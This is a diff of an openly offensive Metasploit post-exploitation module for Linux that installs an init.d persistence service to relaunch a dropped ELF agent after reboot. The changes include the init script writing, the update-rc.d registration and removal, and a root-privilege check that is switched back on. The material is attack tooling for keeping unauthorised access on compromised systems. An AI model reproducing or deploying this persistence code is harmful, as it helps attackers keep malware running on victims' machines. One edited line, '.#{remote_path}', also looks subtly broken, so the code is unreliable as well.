@@ -92,7 +92,7 @@ class MetasploitModule < Msf::Post
                                         'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                 ],
  
-                        'Version'        => '$Revision: 1.3',
+                        'Version'        => '$Revision: 1.4',
                         'DisclosureDate' => 'jun 1 2017',
                         'Platform'       => 'linux',
                         'Arch'           => 'x86_x64',
@@ -105,11 +105,9 @@ class MetasploitModule < Msf::Post
                         'References'     =>
                                 [
                                          [ 'URL', 'http://goo.gl/ny69NS' ],
+                                         [ 'URL', 'http://goo.gl/LZG1LQ' ],
                                          [ 'URL', 'https://github.com/r00t-3xp10it' ],
-                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ],
-                                         [ 'URL', 'https://unix.stackexchange.com/questions/326921/run-two-scripts-with-init-d' ]
-
-
+                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ]
                                 ],
 			'DefaultOptions' =>
 				{
@@ -198,7 +196,7 @@ def ls_stage1
         f.write("#\n")
         f.write("# Give a little time to execute elf agent\n")
         f.write("sleep 5 > /dev/null\n")
-        f.write("sh #{remote_path}")
+        f.write(".#{remote_path}")
         f.close
       end
       print_good("Service path: #{script_check}")
@@ -272,12 +270,12 @@ def ls_stage2
       #
       # Delete init.d script ..
       #
-      print_good("Remove script from init.d directory ..")
-      Rex::sleep(1.0)
-      cmd_exec("rm -f #{script_check}")
-      print_good("Delete persistence service (symlinks) ..")
+      print_good("Deleting persistence service (symlinks) ..")
       cmd_exec("update-rc.d persistance remove")
       Rex::sleep(1.5)
+      print_good("Removing script from init.d directory ..")
+      cmd_exec("rm -f #{script_check}")
+      Rex::sleep(1.0)
 
     #
     # Check init.d persiste script existance (after delete) ..
@@ -348,11 +346,12 @@ def run
     end
     #
     # Check if we are running in an higth integrity context ..
+    # if not runtor =~ /uid=0/
     #
-    #if not is_root?
-    #  print_error("[ ABORT ]: Root access is required ..")
-    #  return nil
-    #end
+    if not is_root?
+      print_error("[ ABORT ]: Root access is required ..")
+      return nil
+    end
     #
     # check for proper session (meterpreter)
     # the non-return of sysinfo command reveals that we are not on a meterpreter session!
